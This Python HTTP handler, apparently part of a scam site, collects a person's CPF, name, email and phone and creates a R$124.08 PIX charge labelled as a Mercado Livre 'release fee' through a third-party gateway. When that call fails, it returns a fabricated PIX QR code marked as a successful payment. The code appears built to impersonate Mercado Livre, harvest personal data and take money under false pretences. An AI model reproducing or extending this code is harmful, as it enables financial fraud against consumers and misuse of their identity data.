from http.server import BaseHTTPRequestHandler
import json
import urllib.parse
import requests
import base64
import re
import uuid
import time
import os

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Parse POST data
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = dict(urllib.parse.parse_qsl(post_data))
        
        cpf_limpo = re.sub(r'[^0-9]', '', params.get('cpf', ''))
        nome = params.get('nome', 'Cliente')
        email = params.get('email', f'cpf{cpf_limpo}@temp.com')
        telefone = re.sub(r'[^0-9]', '', params.get('telefone', '11999999999'))
        
        # Monta o payload para AnubisPay
        anubispay_payload = {
            "payment_method": "pix",
            "amount": 12408,  # R$ 124,08 em centavos
            "customer": {
                "name": nome,
                "email": email,
                "document": {
                    "type": "cpf",
                    "number": cpf_limpo
                },
                "phone": telefone
            },
            "items": [
                {
                    "title": "Taxa de Liberação - Mercado Livre",
                    "unit_price": 12408,
                    "quantity": 1,
                    "tangible": False,
                    "external_ref": f"taxa_liberacao_{cpf_limpo}"
                }
            ],
            "pix": {
                "expires_in_days": 1
            },
            "postback_url": "https://mp-pix-payment.vercel.app/webhook.php",
            "metadata": {
                "provider_name": "Mercado Livre - Taxa de Liberação",
                "cpf": cpf_limpo,
                "nome": nome
            }
        }
        
        # Chaves AnubisPay (via variáveis de ambiente)
        public_key = os.environ.get('ANUBISPAY_PUBLIC_KEY', 'anubispay_live_***')
        secret_key = os.environ.get('ANUBISPAY_SECRET_KEY', 'sk_live_***')
        
        # Autenticação Basic
        auth_string = f"{public_key}:{secret_key}"
        auth_base64 = base64.b64encode(auth_string.encode()).decode()
        
        try:
            # Faz requisição à AnubisPay
            anubispay_url = "https://anubispay-e6cvb0febdfad9df.brazilsouth-01.azurewebsites.net/v1/payment-transaction/create"
            
            anubispay_response = requests.post(
                anubispay_url,
                json=anubispay_payload,
                headers={
                    'Authorization': f'Basic {auth_base64}',
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                timeout=30,
                verify=True
            )
            
            print(f"AnubisPay Status: {anubispay_response.status_code}")
            print(f"AnubisPay Response: {anubispay_response.text[:500]}")
            
            if anubispay_response.status_code == 200:
                anubispay_data = anubispay_response.json()
                
                if anubispay_data.get('success') and anubispay_data.get('data'):
                    transaction_data = anubispay_data['data']
                    pix_data = transaction_data.get('pix', {})
                    
                    response_data = {
                        "success": True,
                        "transaction_id": transaction_data.get('id', ''),
                        "qr_code": pix_data.get('qr_code', ''),
                        "expiration_date": pix_data.get('expiration_date', ''),
                        "status": transaction_data.get('status', 'PENDING'),
                        "amount": transaction_data.get('amount', 12408) / 100,
                        "source": "anubispay"
                    }
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps(response_data).encode())
                    return
                else:
                    error_msg = anubispay_data.get('error_messages', ['Erro desconhecido'])
                    print(f"❌ Erro AnubisPay: {error_msg}")
            else:
                print(f"❌ HTTP Error {anubispay_response.status_code}")
                
        except Exception as e:
            print(f"❌ Erro: {e}")
        
        # Fallback: gera código simulado ÚNICO
        transaction_id = str(uuid.uuid4()).replace('-', '')[:32]
        timestamp = str(int(time.time()))
        unique_part = transaction_id[:12]
        
        # QR code PIX único com timestamp e UUID
        qr_code_simulado = f"00020126360014br.gov.bcb.pix0114{unique_part}{timestamp}520400005303986540512408580258{nome[:25].upper().ljust(25)}6304"
        
        response_data = {
            "success": True,
            "transaction_id": transaction_id,
            "qr_code": qr_code_simulado,
            "expiration_date": "2026-01-08T00:00:00+00:00",
            "status": "PENDING",
            "amount": 124.08,
            "source": "simulated",
            "warning": "Código simulado - Fallback ativo"
        }
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(json.dumps(response_data).encode())

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
